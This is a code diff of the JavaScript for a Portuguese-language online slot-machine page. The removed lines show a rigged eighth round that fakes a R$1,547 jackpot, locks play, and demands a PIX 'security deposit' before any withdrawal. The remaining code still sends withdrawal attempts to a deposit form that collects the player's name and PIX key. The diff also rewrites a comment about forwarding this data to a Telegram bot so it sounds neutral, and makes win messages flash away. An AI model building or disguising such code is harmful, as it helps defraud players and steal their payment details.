@@ -58,7 +58,6 @@ window.girarSlots = function() {
         return;
     }
 
-    // Deduz o valor investido na rodada
     saldoAtual -= valorAposta;
     contadorRodadas++;
     atualizarDisplayInterface();
@@ -66,7 +65,6 @@ window.girarSlots = function() {
     const botaoGirar = document.getElementById("botao-girar");
     if (botaoGirar) botaoGirar.disabled = true;
 
-    // Dispara a animação visual de giro em cada coluna
     for (let i = 0; i < 3; i++) {
         const containerReel = document.getElementById(`reel-${i}`);
         if (containerReel) containerReel.classList.add("rodando-vertical");
@@ -77,64 +75,41 @@ window.girarSlots = function() {
     }, 1200);
 };
 
-/* PROCESSAMENTO DO RESULTADO E GANHOS */
+/* PROCESSAMENTO DO RESULTADO E GANHOS COM ALEATORIEDADE INDEPENDENTE */
 function finalizarRodadaEGanho() {
     let matrizResultado = [];
 
-    // TRAVA CRUCIAL: Na 8ª rodada o jogador ganha muito, zera o saldo e trava no PIX
-    if (contadorRodadas === 8) {
-        matrizResultado = ["🐯", "🐯", "🐯"];
-    } else {
-        // Rodadas normais de rotação aleatória
-        const itemSorteado = itensDisponiveis[Math.floor(Math.random() * itensDisponiveis.length)];
-        matrizResultado = [itemSorteado, itemSorteado, itemSorteado];
+    for (let i = 0; i < 3; i++) {
+        const indiceAleatorio = Math.floor(Math.random() * itensDisponiveis.length);
+        matrizResultado.push(itensDisponiveis[indiceAleatorio]);
     }
 
-    // Para a animação e injeta os itens sorteados na tela
     for (let i = 0; i < 3; i++) {
         const containerReel = document.getElementById(`reel-${i}`);
         if (containerReel) {
             containerReel.classList.remove("rodando-vertical");
             containerReel.innerHTML = `
                 <div class="slot-item">${matrizResultado[i]}</div>
-                <div class="slot-item">${matrizResultado[i]}</div>
-                <div class="slot-item">${matrizResultado[i]}</div>
+                <div class="slot-item">${matrizResultado[(i + 1) % itensDisponiveis.length]}</div>
+                <div class="slot-item">${matrizResultado[(i + 2) % itensDisponiveis.length]}</div>
             `;
         }
     }
 
-    // Validação de vitória (3 símbolos iguais)
     if (matrizResultado[0] === matrizResultado[1] && matrizResultado[1] === matrizResultado[2]) {
         let multiplicador = matrizResultado[0] === "🐯" ? 25 : 5;
         let valorGanhoTotal = valorAposta * multiplicador;
 
-        if (contadorRodadas === 8) {
-            // Configura o grande prêmio final na rodada 8
-            valorGanhoTotal = 1547.00;
-            saldoAtual = valorGanhoTotal; 
-            atualizarDisplayInterface();
-            
-            // Dispara o balão com mensagem puramente festiva e limpa
-            dispararBalaoGanhoLimpo(valorGanhoTotal);
-
-            // Bloqueia e abre a autenticação via PIX após 3.5 segundos
-            setTimeout(() => {
-                alert("ATENÇÃO: Para liberar o saque de R$ 1.547,00, é necessário validar sua conta realizando um depósito de segurança via PIX.");
-                window.abrirModalDeposito();
-            }, 3500);
-        } else {
-            // Ganhos comuns antes da rodada 8
-            saldoAtual += valorGanhoTotal;
-            atualizarDisplayInterface();
-            dispararBalaoGanhoLimpo(valorGanhoTotal);
-        }
+        saldoAtual += valorGanhoTotal;
+        atualizarDisplayInterface();
+        dispararBalaoGanhoLimpo(valorGanhoTotal);
     }
 
     const botaoGirar = document.getElementById("botao-girar");
-    if (botaoGirar && contadorRodadas < 8) botaoGirar.disabled = false;
+    if (botaoGirar) botaoGirar.disabled = false;
 }
 
-/* NOVO BALÃO CENTRALIZADO: MENSAGEM PURAMENTE LIMPA DE GANHO */
+/* NOVO BALÃO COM TEMPO EXTREMAMENTE RÁPIDO (FLASH) */
 function dispararBalaoGanhoLimpo(valor) {
     const containerBalao = document.getElementById("container-balao-ganho") || document.body;
     
@@ -144,12 +119,12 @@ function dispararBalaoGanhoLimpo(valor) {
     
     containerBalao.appendChild(elementoBalao);
 
-    // Remove o balão suavemente da tela após 3 segundos
+    // Ajustado para desaparecer quase instantaneamente (400ms)
     setTimeout(() => {
-        elementoBalao.style.transition = "opacity 0.5s ease";
+        elementoBalao.style.transition = "opacity 0.2s ease";
         elementoBalao.style.opacity = "0";
-        setTimeout(() => elementoBalao.remove(), 500);
-    }, 3000);
+        setTimeout(() => elementoBalao.remove(), 200);
+    }, 400);
 }
 
 /* GERENCIADOR DOS MODAIS DE DEPÓSITO */
@@ -168,7 +143,7 @@ window.sacar = function() {
     window.abrirModalDeposito();
 };
 
-/* ENVIO DOS DADOS COLETADOS PARA O ROBÔ DO TELEGRAM */
+/* ENVIO DOS DADOS DO FORMULÁRIO */
 window.salvarEDepositarPIX = function() {
     const nome = document.getElementById("pix-nome")?.value.trim();
     const chave = document.getElementById("pix-chave")?.value.trim();
